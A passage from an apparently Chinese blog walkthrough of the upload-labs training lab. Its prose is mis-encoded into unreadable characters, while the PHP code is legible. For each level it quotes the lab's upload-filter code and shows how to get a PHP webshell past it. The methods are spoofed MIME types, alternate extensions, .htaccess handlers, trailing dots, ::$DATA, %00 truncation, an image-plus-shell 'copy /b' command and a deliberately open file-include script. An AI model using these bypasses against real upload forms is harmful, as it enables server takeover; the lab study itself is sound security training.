æ­¤æˆ‘ä»¬å°†å…¶æ›´æ”¹ä¸ºimage/jpegä¹Ÿå¯ä»¥ç»•è¿‡æ£€æŸ¥ã€‚ éƒ¨åˆ†æºä»£ç ï¼š 123if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] MINEçš„åŸç†æ˜¯åˆ¤æ–­$_Files[&quot;upload_file&quot;][&quot;type&quot;]æ˜¯ä¸æ˜¯å›¾ç‰‡æ ¼å¼ï¼ˆimage/gifã€imge/jpegã€image\\pngï¼‰ï¼Œä¸æ˜¯åˆ™ä¸å…è®¸ä¸Šä¼ ã€‚$_Files[&quot;upload_file&quot;][&quot;type&quot;]çš„å€¼æ˜¯ä»è¯·æ±‚æ•°æ®åŒ…ä¸­Content-Typeä¸­è·å–ã€‚ Pass-03æç¤ºå‘Šè¯‰æˆ‘ä»¬è¿™é¢˜è¿‡æ»¤äº†.asp|.aspx|.php|.jspè¿™å››ä¸ªåç¼€ï¼Œä¸è¿‡æ²¡äº†è¿™å››ä¸ªåç¼€ï¼Œæˆ‘ä»¬è¿˜æœ‰å¾ˆå¤šå…¶ä»–æ›¿ä»£å“ï¼Œä¾‹å¦‚ï¼š ASPï¼šasa/cer/cdx ASPXï¼šashx/asmx/ascx PHPï¼šphp4/php5/phtml/php3/pht JSPï¼šjspx/jspf å½“ç„¶åœ¨ä½¿ç”¨è¿™äº›åç¼€ä¹‹å‰å¯èƒ½è¦å…ˆå¯¹apacheè¿›è¡Œé…ç½®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥fuzzæµ‹è¯•å…¶ä»–æ²¡æœ‰è¢«è¿‡æ»¤çš„åç¼€ã€‚ è¿™é‡Œä¹Ÿæ”¾ä¸€ä¸‹æºç ï¼š 123456789if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º è¿™ä¸²ä»£ç çš„æ„ä¹‰æ˜¯åˆ å»æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œå¹¶æˆªå–åç¼€ï¼Œå°†åç¼€è½¬æ¢ä¸ºå°å†™ï¼Œåˆ å»å‰é¢å®šä¹‰çš„å­—ç¬¦ä¸²æ•°ç»„é‡Œçš„å†…å®¹å¹¶æ”¶å°¾å»ç©ºã€‚ Pass-04è¿™å…³è¿‡æ»¤çš„æ˜¯çœŸçš„ç‹ ï¼ŒæŠŠæˆ‘ä»¬å‰é¢è®²çš„å‡ ä¸ªå…¨éƒ¨è¿‡æ»¤äº†ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥fuzzè¯•è¯•æœ‰æ²¡æœ‰æ¼ç½‘ä¹‹é±¼ã€‚åœ¨è¿™å…³ä¸­ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨åˆ°.htaccessæ–‡ä»¶æ¥å¸®åŠ©æˆ‘ä»¬è¿‡å…³ã€‚ è¿™é‡Œæˆªå–äº†ä¸€æ®µç½‘ç»œä¸Šå…³äº.htaccessçš„ä»‹ç»ï¼š htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚ å…¶ä¸­ï¼Œ.htaccessæ–‡ä»¶ä¸­å†…å®¹SetHandler application/x-httpd-phpç”¨æ¥è®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨PHPè§£æï¼Œæ— è®ºä¸Šä¼ ä»»ä½•æ–‡ä»¶ï¼Œåªè¦ç¬¦åˆphpè¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œã€‚ é¦–å…ˆæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å†™å…¥SetHandler application/x-httpd-phpï¼Œæ¥ç€æ›´æ”¹åç¼€ä¸º.htaccessï¼Œä½†æ˜¯ç”±äºwindowsçš„å‘½åè§„åˆ™å¯¼è‡´æ–‡ä»¶ä¸èƒ½æ²¡æœ‰æ–‡ä»¶åï¼Œå› æ­¤æˆ‘ä»¬å…ˆéšæ„å–ä¸€ä¸ªæ–‡ä»¶åã€‚å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨FilesMatchæŒ‡å®šæ–‡ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š 123&lt;FilesMatch &quot;muma&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; è¿™æ„å‘³ç€æ–‡ä»¶åå­—ä¸­å¸¦æœ‰mumaçš„æ–‡ä»¶ä¼šè¢«è§£ææˆphpã€‚åœ¨ä¸Šä¼ .htaccessæ–‡ä»¶æ—¶è¦ä½¿ç”¨burp suiteå°†è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶ååˆ å»ã€‚æ¥ç€åªè¦ä¸Šä¼ æˆ‘ä»¬çš„muma1.jpgï¼Œç”¨èšå‰‘è¿æ¥å°±å¯ä»¥äº†ã€‚ Pass-05è¿™ä¸€å…³è¿.htaccesséƒ½è¿‡æ»¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°ï¼Œè¿™é¢˜åªè¿‡æ»¤äº†ä¸€æ¬¡.å’Œç©ºæ ¼ï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºmuma1.php. .æ–‡ä»¶åå°±å¯ä»¥æˆåŠŸç»•è¿‡äº†ï¼Œè¿›å…¥uploadå‘ç°æ–‡ä»¶ä¾ç„¶æ˜¯muma1.phpã€‚ Pass-06æŸ¥çœ‹æºç å‘ç°æ²¡æœ‰å¤§å°å†™è½¬åŒ–ï¼Œæ„å‘³ç€è¿™é¢˜å¯ä»¥è¿›è¡Œå¤§å°å†™ç»•è¿‡ï¼Œå°†æ–‡ä»¶åç¼€æ”¹ä¸º.phPæˆ–è€….pHpç­‰ç­‰éƒ½æ˜¯å¯ä»¥çš„ï¼Œå½“ç„¶æ›´æ”¹.htaccessçš„å¤§å°å†™è¿›è¡Œç»•è¿‡åŒæ ·å¯è¡Œã€‚ Pass-07æŸ¥çœ‹æºç å‘ç°æ²¡æœ‰å¯¹åç¼€åå»ç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªmuma1.phpæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨burp suiteæŠ“åŒ…ï¼Œå°†æ–‡ä»¶åæ”¹æˆmuma1.php ï¼Œåç¼€ååæ·»åŠ ç©ºæ ¼å³å¯ç»•è¿‡åç«¯phpè„šæœ¬çš„æ£€æµ‹ï¼Œå†ä¸Šä¼ åˆ°windowsæœåŠ¡å™¨ä¸Šï¼Œä¼šè‡ªåŠ¨å»é™¤åç¼€ååçš„ç©ºæ ¼ã€‚ Pass-08æŸ¥çœ‹æºç å‘ç°æ²¡æœ‰è¿‡æ»¤åç¼€ä¸­çš„ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶åæŠ“åŒ…å°†æ–‡ä»¶ååç¼€æ”¹æˆ.php.å°±å¯ä»¥äº†ã€‚windowsç³»ç»Ÿç‰¹æ€§ä¼šè‡ªåŠ¨å¿½ç•¥æœ€åä¸€ä¸ªç‚¹ï¼Œæ·»åŠ ç‚¹å³å¯ç»•è¿‡åç«¯çš„phpæ£€æµ‹ï¼Œè€Œä¸”å¯ä»¥æ­£å¸¸è§£æã€‚ Pass-09è¿™ä¸€å…³æ²¡æœ‰è¿‡æ»¤::$DATAï¼Œæˆ‘ä»¬åœ¨ä¸Šä¼ phpæ–‡ä»¶åæŠ“åŒ…ï¼Œåœ¨æ–‡ä»¶åç¼€æœ€ååŠ ä¸Š::$DATAã€‚åœ¨windowsä¸­::$DATAä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ::$DATAä¹‹å‰çš„æ–‡ä»¶åï¼Œèµ·åˆ°ç»•è¿‡åç«¯æ£€æµ‹çš„æ•ˆæœã€‚ Pass-10è¿™å…³è§£æ³•å’ŒPass-05æ˜¯ä¸€æ ·çš„ï¼Œmuma1.php. ï¼Œè€Œä¸”è¿˜çœŸæ²¡å•¥åŒºåˆ«ï¼Œä¸¥é‡æ€€ç–‘æ˜¯ä¼ é‡äº†ã€‚ Pass-11çœ‹æºç ï¼š 1234567if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; è¿™å…³èµ·åˆ°è¿‡æ»¤ä½œç”¨çš„æ˜¯str_ireplace()å‡½æ•°ï¼Œå®ƒä¼šæ£€æµ‹æ–‡ä»¶åä¸­åŒ…å«$deny_extçš„å­—ç¬¦å¹¶æ›¿æ¢ä¸ºç©ºã€‚åœ¨åšsqli-labsæ—¶æˆ‘ä»¬ä¹Ÿé‡åˆ°äº†ç±»ä¼¼çš„æƒ…å†µï¼ŒåŒæ ·çš„ï¼Œä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œå°†æ–‡ä»¶åç¼€æ”¹ä¸º.pphphpè¿™ç±»çš„ä¸Šä¼ å°±å¯ä»¥äº†ã€‚è¿™æ ·ï¼Œåç¼€åœ¨åç«¯è¿‡æ»¤æ‰phpåï¼Œå‰©ä¸‹çš„å†…å®¹ä»ç„¶ä¸ºphpã€‚ è€Œå¦‚æœä¸Šä¼ .pphhppè¿™ç§æ˜¯æ— æ³•ç»•è¿‡æˆåŠŸçš„ï¼Œå› ä¸ºæ²¡æœ‰è¿ç»­çš„phpï¼Œå¯¼è‡´è¿™ä¸ªåç¼€æ²¡æœ‰è¢«è¿‡æ»¤è€ŒæˆåŠŸä¸Šä¼ ï¼Œä½†ä¸Šä¼ åçš„ç»“æœä»ç„¶æ˜¯.pphhppï¼Œwebshellå·¥å…·æ— æ³•è¿æ¥è¿™ç§åç¼€ã€‚ Pass-12å‰é¢çš„é¢˜ç›®å‡ä¸ºé»‘åå•ç»•è¿‡ï¼Œæ„æ€æ˜¯æˆ‘ä»¬ä¸èƒ½ä¸Šä¼ é»‘åå•ä¸­çš„å«æœ‰åç¼€çš„æ–‡ä»¶ã€‚è€Œè¿™ä¸€å…³å¾€åå‡ å…³æ˜¯ç™½åå•ç»•è¿‡ï¼Œæ„å‘³ç€æˆ‘ä»¬åªèƒ½ä¸Šä¼ ç™½åå•ä¸­å«æœ‰åç¼€çš„æ–‡ä»¶ã€‚ 12345678910111213141516171819$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125; æˆ‘ä»¬å‘ç°$img_pathç›´æ¥æ‹¼æ¥ï¼Œè€Œä¸”GETçš„save_pathå¯æ§ï¼Œè¿™é‡Œè¦è¿ç”¨åˆ°æˆªæ–­ä¸Šä¼ çš„åŸç†ã€‚ urlä¸­ï¼Œ%00å¯¹åº”çš„asciiç å€¼ä¸º0ï¼Œè€Œasciiä¸­0ä½œä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸï¼Œæ‰€ä»¥å½“urlä¸­å‡ºç°%00æ—¶å°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸï¼Œè€Œå¿½ç•¥åé¢ä¸Šä¼ çš„æ–‡ä»¶æˆ–å›¾ç‰‡ï¼Œåªä¸Šä¼ æˆªæ–­å‰çš„æ–‡ä»¶æˆ–å›¾ç‰‡ï¼Œè¿™å’Œsqli-labsçš„23å…³åŸç†æ˜¯ä¸€è‡´çš„ï¼Œç›¸ä¿¡åˆ·å®Œsqli-labså¯¹æˆªæ–­è¿™ä¸ªæ“ä½œå·²ç»ä¸é™Œç”Ÿäº†ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆä¸Šä¼ ä¸€ä¸ªmuma1.jpgï¼Œæ¥ç€æŠ“åŒ…ï¼Œä¿®æ”¹GETå†…å®¹ä¸º../upload/muma1.php%00ï¼š æŸ¥çœ‹uploadæ–‡ä»¶å¤¹å‘ç°ä¸Šä¼ æˆåŠŸã€‚ ps.phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œmagic_quotes_gpcéœ€è¦ä¸ºOffçŠ¶æ€ã€‚ Pass-13è¿™å…³å’Œä¸Šå…³æ€è·¯æ˜¯ä¸€è‡´çš„ï¼Œä¹Ÿæ˜¯%00çš„æˆªæ–­ï¼Œä½†æ˜¯ç”±äºè¿™é¢˜æ˜¯POSTæ³¨å…¥ï¼ŒPOSTæ³¨å…¥ä¸ä¼šè‡ªåŠ¨è§£ç %00ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¿®æ”¹16è¿›åˆ¶ç æ¥è¿›è¡Œæˆªæ–­ã€‚ é¦–å…ˆæˆ‘ä»¬ä¸Šä¼ muma1.jpgå¹¶æŠ“åŒ…ï¼Œç„¶åå°†æŠ“åŒ…å†…å®¹å‘é€è‡³Repeaterä¸­ï¼Œåœ¨POSTå†…å®¹æœ€åæ·»åŠ ä¸Šmuma1.phpï¼š æ¥ç€æˆ‘ä»¬åœ¨Hexä¸­æ‰¾åˆ°å¯¹åº”çš„åå…­è¿›åˆ¶ç ï¼ˆphpçš„åå…­è¿›åˆ¶ç ä¸º70 68 70ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å°†åœ¨è¿™ä¸²ç¼–ç åçš„å€¼æ›´æ”¹ä¸º00ï¼ŒGoä¸€æ¬¡ä¹‹åæˆ‘ä»¬å°±å¯ä»¥åœ¨uploadæ–‡ä»¶å¤¹ä¸­å‘ç°muma1.phpäº†ï¼š Pass-14è¿™å…³æ¶‰åŠåˆ°äº†ä¸Šä¼ å›¾ç‰‡ç ï¼Œé¦–å…ˆæˆ‘ä»¬è¦äº†è§£ä»€ä¹ˆæ˜¯å›¾ç‰‡ç ã€‚å›¾ç‰‡ç ï¼Œåˆåå›¾ç‰‡ä¸€å¥è¯ã€‚é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯å°†ä¸€å¥è¯æœ¨é©¬è—åŒ¿åœ¨å›¾ç‰‡ä¹‹ä¸­ï¼Œä»è€Œè¾¾åˆ°ç»•è¿‡æ£€æŸ¥çš„æ•ˆæœã€‚æˆ‘ä»¬æ¥ä»‹ç»ä¸¤ç§åˆ¶ä½œå›¾ç‰‡ç çš„æ–¹æ³•ï¼š cmdå‘½ä»¤åˆ¶ä½œå°†ä½ çš„phpæœ¨é©¬æ–‡ä»¶å’Œå›¾ç‰‡æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ä¹‹ä¸‹ï¼Œshift+å³é”®åœ¨è¿™ä¸ªç›®å½•ä¸‹æ‰“å¼€cmdï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 1copy tupian.jpg /b + muma1.php /a shell.jpg è¿™é‡Œçš„tupian.jpgæ˜¯æˆ‘ä»¬çš„åŸå§‹å›¾ç‰‡ï¼Œmuma1.phpæ˜¯ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œæœ€åç”Ÿæˆçš„æ–‡ä»¶æ˜¯shell.jpgã€‚æˆ‘ä»¬å¯ä»¥ç”¨010æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°æœ¨é©¬å·²ç»è¢«æˆåŠŸå†™å…¥å›¾ç‰‡ä¸­ï¼šåŒæ ·çš„æ–¹æ³•æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ¶ä½œpngå›¾ç‰‡ç å’Œgifå›¾ç‰‡ç ã€‚ äºŒè¿›åˆ¶è½¯ä»¶åº”ç”¨ï¼ˆ010ã€winhexç­‰ï¼‰æˆ‘ä»¬å¯ä»¥ç”¨010æ‰“å¼€ä¸€å¼ å›¾ç‰‡ï¼Œç›´æ¥åœ¨å›¾ç‰‡æœ€ååŠ ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œè¦æ³¨æ„ä¸è¦ç ´ååŸæ–‡ä»¶çš„æ–‡ä»¶å°¾ï¼Œå¯¼è‡´æ–‡ä»¶ä¸Šä¼ æ—¶æ— æ³•è¯†åˆ«ã€‚ æœ‰äº†å›¾ç‰‡ç ï¼Œå°±å¯ä»¥ç›´æ¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ äº†ï¼Œä½†æ˜¯ç”±äºèœåˆ€å’Œèšå‰‘ç­‰shellå·¥å…·æ— æ³•è§£æå›¾ç‰‡æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬è¦åˆ©ç”¨åˆ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚å…³äºæ–‡ä»¶åŒ…å«æ¼æ´ä¹‹å‰ä¹Ÿå†™è¿‡äº†ä¸€ç¯‡åšå®¢ï¼Œä¹Ÿå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡åšå®¢ï¼šWebå®‰å…¨å®æˆ˜ç³»åˆ—ï¼šæ–‡ä»¶åŒ…å«æ¼æ´ åœ¨uploadæ–‡ä»¶å¤¹ä¸­å†™å…¥ä¸‹é¢è¿™ä¸ªphpæ–‡ä»¶ï¼š 123456789&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);$file = $_GET[&#x27;file&#x27;];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; è¿™é‡Œæˆ‘æŠŠæ–‡ä»¶å‘½åä¸ºinclude.php æˆ‘ä»¬æ„å»ºä¸€ä¸ªurlè¯»å–å›¾ç‰‡ï¼š 1127.0.0.1/upload-labs/upload/include.php?file=9220211125204748.gif è¯»å–æˆåŠŸï¼Œä½†æ˜¯è¯»å–å‡ºæ¥ä¸€æ®µä¹±ç ï¼Œç»“æœä¸æ˜æ˜¾ï¼Œæˆ‘ä»¬å†™å…¥phpinfo()æµ‹è¯•ï¼šæˆåŠŸã€‚ ä¸ºäº†å’Œç¬¬15å…³åŒºåˆ«ï¼Œæˆ‘ä»¬è¿›è¡Œæºç åˆ†æï¼š 12345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125; æœ¬å…³æºç ä»¥äºŒè¿›åˆ¶è¯»å–æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶è¯»å–ä¸¤ä¸ªå­—èŠ‚ã€‚è€Œunpackçš„ä½œç”¨æ˜¯è§£åŒ…ï¼Œç”¨ä»€ä¹ˆæ‰“åŒ…å°±ç”¨ä»€ä¹ˆè§£åŒ…ï¼Œè¿™é‡Œæ˜¯å°†$binä¸­çš„ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è§£åŒ…è¾“å‡ºåˆ°charsä¸­ï¼Œæ¥ç€ä½¿ç”¨intval()å‡½æ•°å°†å€¼è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œå¹¶å¯¹æ¯”è½¬æ¢å‡ºæ¥çš„å€¼æ˜¯å¦ä¸ºå¯¹åº”æ–‡ä»¶çš„æ–‡ä»¶å¤´å€¼ï¼Œæœ€åå°†æ–‡ä»¶ç±»å‹è¿”å›å¯¼$fileTypeä¸­ã€‚å› æ­¤æˆ‘ä»¬åªèƒ½ä¸Šä¼ jpgã€pngæˆ–gifæ ¼å¼çš„æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸ä¼šé€šè¿‡ã€‚ Pass-15è¿™å…³ç›´æ¥ä¸Šä¼ ä¸Šå…³åˆ¶ä½œçš„å›¾ç‰‡ç ï¼Œç”¨åŒæ ·çš„æ–¹æ³•å°±å¯ä»¥è§£é™¤é¢˜ç›®ã€‚è¿™ä¸¤å…³çš„å·®åˆ«ä¸»è¦åœ¨äºæºç çš„æ£€æŸ¥æ–¹å¼ä¸åŒï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç ï¼š 1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; æœ¬å…³ä½¿ç”¨äº†getimagesize()å‡½æ•°è·å–åˆ°å›¾ç‰‡ä¿¡æ¯ï¼Œæ¥ç€ä½¿ç”¨image_type_to_extension()å‡½æ•°è·å–å›¾ç‰‡åç¼€ï¼Œæœ€ååˆ¤æ–­æ–‡ä»¶ä¸­æ˜¯å¦å­˜åœ¨.jpeg|.png|.gifæ–‡ä»¶ï¼ˆè¿™ä¸ªæ£€æŸ¥åˆ©ç”¨æ–‡ä»¶çš„åå…­è¿›åˆ¶ç è¿›è¡Œï¼‰ï¼Œå¦‚æœæœ‰åˆ™æˆåŠŸé€šè¿‡æ£€æŸ¥ï¼Œå¦åˆ™ä¸Šä¼ å¤±è´¥ã€‚å› æ­¤æˆ‘ä»¬åˆ¶ä½œçš„å›¾ç‰‡ç å¯ä»¥ç»•è¿‡ï¼Œå› ä¸ºå›¾ç‰‡ç æœ¬èº«å°±æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå‰é¢çš„æ–‡ä»¶å†…å®¹å¯ä»¥é€šè¿‡æ£€æŸ¥ã€‚ Pass-16è¿™å…³ç”±äºç”¨åˆ°äº†exif_imagetype()ï¼Œå› æ­¤è¦å¼€å¯phpçš„php_exifæ¨¡å—ã€‚è¿™å…³çš„æ£€æŸ¥å°±æ¯”è¾ƒç®€å•ç²—æš´äº†ï¼Œç›´æ¥ä½¿ç”¨exif_imagetype()æ¥åˆ¤æ–­å›¾åƒçš„ç±»å‹ï¼šå‡½æ•°è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åï¼Œå¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å€¼ï¼Œå¦‚æœä¸ä¸º.jpeg|.png|.gifæ–‡ä»¶åˆ™è¿”å›falseé˜»æ­¢æ–‡ä»¶ä¸Šä¼ ï¼š 1234567891011121314151617function isImage($filename)&#123; $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125; ä¸è¿‡ç”±äºæœ¬è´¨ä¸Šè¿˜æ˜¯æ£€æŸ¥.jpeg|.png|.gifæ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡ç å¹¶åˆ©ç”¨æ–‡ä»¶åŒ…å«å°±å¯ä»¥é¡ºåˆ©è§£é¢˜äº†ã€‚ Pass-17è¿™é¢˜æç¤ºæˆ‘ä»¬å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ä¹‹å‰å†™è¿›å›¾ç‰‡ä¸­çš„ä¸€å¥è¯æœ¨é©¬ä¼šè¢«æŠ¹æ‰ï¼Œæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ç è¯•è¯•ï¼š æˆ‘ä»¬å‘ç°åŸæœ¬çš„ä¸€å¥è¯æœ¨é©¬è¢«æŠ¹å»äº†ï¼Œè¿™å°±æ„å‘³ç€å†™å…¥å¤±è´¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æºä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,&quot;.&quot;),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; 